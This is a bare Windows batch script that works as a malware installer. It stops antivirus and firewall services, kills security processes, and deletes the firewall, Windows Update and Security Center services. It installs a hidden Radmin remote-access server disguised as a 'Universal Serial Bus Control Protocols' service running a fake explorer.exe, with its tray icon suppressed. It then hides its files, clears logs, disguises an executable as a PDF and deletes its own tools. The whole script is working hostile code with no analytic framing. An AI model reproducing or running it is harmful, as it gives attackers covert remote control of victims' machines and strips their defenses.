net stop MCShield
net stop DefWatch
net stop Navapsvc
net stop "Symantec Antivirus"
net stop ccsetmgr /y
net stop UniSerialControl
cd %systemroot%\restore\com\
pv -kf gcasServ.exe
pv -kf gcasDtServ.exe
net stop SharedAccess
net stop wuauserv
net stop wscsvc
sc.exe delete sharedaccess
sc.exe delete wuauserv
sc.exe delete wscsvc
sc.exe delete UniSerialControl
serv.exe INSTALL UniSerialControl /n:"Universal Serial Bus Control Protocols" /b:%systemroot%\restore\com\explorer.exe /u:LocalSystem /s:AUTO /i:yes
dtreg -AddKey \HKLM\SYSTEM\RAdmin
dtreg -AddKey \HKLM\SYSTEM\RAdmin\v2.0
dtreg -AddKey \HKLM\SYSTEM\RAdmin\v2.0\Server
dtreg -AddKey \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters
dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\DisableTrayIcon=01000000
dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port=6c270000
dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter=e96789f97f6717acccac2ae6740a2364
dtreg -Set REG_EXPAND_SZ "\HKLM\SYSTEM\CurrentControlSet\Services\UniSerialControl\ImagePath=%systemroot%\restore\com\explorer.exe /service"
dtreg -Set REG_DWORD \HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RestrictAnonymous=0x00000002
sc.exe description UniSerialControl "Provides a serial bus standard for connecting devices."
net start UniSerialControl
cd %systemroot%\restore\com\
move %systemroot%\restore\com\pv.exe "%systemroot%\system32\pv.exe"
move %systemroot%\restore\com\pskill.exe "%systemroot%\system32\pskill.exe"
move %systemroot%\restore\com\sc.exe "%systemroot%\system32\sc.exe"
attrib -s -h -a C:\Recycler\1.exe
del C:\Recycler\1.exe
attrib +s +h +a %systemroot%\restore\*
attrib +s +h +a %systemroot%\restore\* /s /d
attrib +s +h +a %systemroot%\restore\ /s /d
attrib +s +h +a %systemroot%\restore\com\explorer.exe
attrib +s +h +a %systemroot%\restore\com\AdmDll.dll
attrib +s +h +a %systemroot%\restore\com\raddrv.dll
%systemroot%\system32\fclear.exe all
move C:\msnupd.exe %windir%\msnins.pdf
move %systemroot%\restore\com\rundll32.exe %windir%\runbatch.com
cd %windir%
dek msnins.pdf
del runbatch.com
attrib +s +h msnins.pdf
attrib +s +h runbatch.com
cd %systemroot%\restore\com\
del dtreg.exe
del serv.exe
del rundll32.exe
:exit
